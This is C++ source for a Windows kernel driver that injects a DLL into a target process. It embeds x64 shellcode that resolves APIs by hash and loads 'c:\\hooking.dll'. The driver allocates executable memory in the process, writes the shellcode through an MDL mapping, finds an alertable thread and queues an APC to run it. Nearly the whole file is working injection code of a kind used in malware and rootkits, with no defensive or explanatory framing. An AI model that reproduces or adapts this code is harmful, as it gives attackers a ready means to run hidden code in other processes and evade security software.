#include <main.h>



unsigned char load_dll_shellcode[] = "\x48\x89\xe0\x48\x81\xe4\x00\xff\xff\xff\x48\x83\xc4\x08\x50\xe8"
"\x00\x00\x00\x00\x41\x5f\xb9\x55\x95\xdb\x6d\xe8\x5b\x00\x00\x00"
"\x49\x89\xc4\x48\x83\xf8\x00\x0f\x84\x1b\x01\x00\x00\xb9\xfb\xf0"
"\xbf\x5f\x4c\x89\xe2\xe8\x80\x00\x00\x00\x48\x83\xf8\x00\x0f\x84"
"\x04\x01\x00\x00\x48\x83\xec\x10\x49\x8d\x8f\x24\x01\x00\x00\xff"
"\xd0\x48\x83\xc4\x10\xe9\xee\x00\x00\x00\x53\x57\xb8\x05\x15\x00"
"\x00\x80\x39\x00\x74\x12\x89\xc3\xc1\xe0\x05\x01\xd8\x48\x0f\xb6"
"\x39\x01\xf8\x48\x01\xd1\xeb\xe9\x5f\x5b\xc3\x53\x65\x4c\x8b\x1c"
"\x25\x60\x00\x00\x00\x4d\x8b\x5b\x18\x4d\x8d\x5b\x20\x49\x8b\x1b"
"\x51\x48\x8b\x4b\x50\xba\x02\x00\x00\x00\xe8\xbb\xff\xff\xff\x59"
"\x48\x39\xc8\x74\x0f\x48\x8b\x1b\x4c\x39\xdb\x75\xe3\xb8\x00\x00"
"\x00\x00\xeb\x04\x48\x8b\x43\x20\x5b\xc3\x41\x53\x41\x54\x41\x55"
"\x41\x56\x41\x57\x53\x48\x89\xd3\x48\x0f\xb7\x53\x3c\x48\x01\xda"
"\x8b\x92\x88\x00\x00\x00\x48\x01\xda\x44\x8b\x5a\x1c\x49\x01\xdb"
"\x44\x8b\x62\x20\x49\x01\xdc\x44\x8b\x6a\x24\x49\x01\xdd\x44\x8b"
"\x72\x14\x41\xbf\x00\x00\x00\x00\x51\x43\x8b\x0c\xbc\x48\x01\xd9"
"\xba\x01\x00\x00\x00\xe8\x50\xff\xff\xff\x59\x48\x39\xc8\x74\x0f"
"\x49\xff\xc7\x4d\x39\xf7\x75\xe0\xb8\x00\x00\x00\x00\xeb\x0d\x4b"
"\x0f\xb7\x44\x7d\x00\x41\x8b\x04\x83\x48\x01\xd8\x5b\x41\x5f\x41"
"\x5e\x41\x5d\x41\x5c\x41\x5b\xc3\x63\x3a\x5c\x5c\x68\x6f\x6f\x6b"
"\x69\x6e\x67\x2e\x64\x6c\x6c\x00\x5c\xc3";





NTSTATUS Inject(PINJECTION_INFO InjectionInfo)
{
	DbgPrint("[*] trying to inject dll to target process\n");
	PEPROCESS Process;
	NTSTATUS Status;
	void* shellcode_address{ };
	size_t shellcode_size = sizeof(load_dll_shellcode);
	ULONG	TargetPid = InjectionInfo->TargetPid;




	// attach to target process cr3
	ProcAttach attach(TargetPid);
	if (!attach.IsAttached())
	{
DbgPrint("[*] failed to attach to %d\n", TargetPid);
return STATUS_INVALID_PARAMETER;
	}

	// allocate memory for  apc func
	Status = ZwAllocateVirtualMemory(NtCurrentProcess(), &shellcode_address, 0, &shellcode_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READ);
	if (!NT_SUCCESS(Status))
	{
		DbgPrint("[*] faild to allocate memory for apc function\n");
		return Status;
	}
	// map another mapping with RW protection so we can write the function to the allocation 
	auto mdl = IoAllocateMdl(
		shellcode_address,
		shellcode_size,
		false,
		false,
		nullptr
	);
	if (!mdl)
	{
		DbgPrint("[*] failed to allocate mdl\n");
		ZwFreeVirtualMemory(NtCurrentProcess(), &shellcode_address, &shellcode_size, MEM_RELEASE);
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
	auto mapped_address = MmMapLockedPagesSpecifyCache(
		mdl,
		KernelMode,
		MmNonCached,
		nullptr,
		false,
		NormalPagePriority
	);
	if (!mapped_address) {
		DbgPrint("[*] failed to create another mapping for address\n");
		MmUnlockPages(mdl);
		IoFreeMdl(mdl);
		ZwFreeVirtualMemory(NtCurrentProcess(), &shellcode_address, &shellcode_size, MEM_RELEASE);
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	Status = MmProtectMdlSystemAddress(
		mdl,
		PAGE_READWRITE
	);

	if (!NT_SUCCESS(Status)) {
		DbgPrint("[*] failed to set mdl protection\n");
		MmUnmapLockedPages(mapped_address, mdl);
		MmUnlockPages(mdl);
		IoFreeMdl(mdl);
		ZwFreeVirtualMemory(NtCurrentProcess(), &shellcode_address, &shellcode_size, MEM_RELEASE);
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	// copy shellcode to target process  

	memcpy_s(mapped_address, sizeof(load_dll_shellcode), load_dll_shellcode, sizeof(load_dll_shellcode));
	MmUnmapLockedPages(mapped_address, mdl);
	MmUnlockPages(mdl);
	IoFreeMdl(mdl);

	// find target thread 
	ProcessInfo process_info;
	PKTHREAD target_thread;
	Status = get_process_info_by_pid(TargetPid, &process_info);
	if (!NT_SUCCESS(Status))
	{
		DbgPrint("[*] failed getting process information\n");
		ZwFreeVirtualMemory(NtCurrentProcess(), &shellcode_address, &shellcode_size, MEM_RELEASE);
		return STATUS_UNSUCCESSFUL;
	}
	for (size_t i = 0; i < process_info.number_of_threads; i++) {
		if (!NT_SUCCESS(PsLookupThreadByThreadId((HANDLE)process_info.threads_id[i], &target_thread))) {
			DbgPrint("[*] failed looking up thread\n");
			ExFreePool(process_info.threads_id);
			return STATUS_UNSUCCESSFUL;
		}

		// check alertable flag in kthread
		PULONG KthreadFlags = reinterpret_cast<PULONG>(reinterpret_cast<ULONG_PTR>(target_thread) + KTHREAD_FLAGS_OFFSET);
		bool Alertable = ((*KthreadFlags >> ALERTABLE_BIT) & 1) != 0;
		if (Alertable)
		{
			DbgPrint("[*] found alertable thread\n");

			// queue apc to the first thread we find 
			if (QueueUserApc(target_thread, shellcode_address))
				DbgPrint("[*] successfully queued apc to target thread\n");

			ObDereferenceObject(target_thread);
			break;
		} 
		ObDereferenceObject(target_thread);
	}


	ExFreePool(process_info.threads_id);
	return STATUS_SUCCESS;

}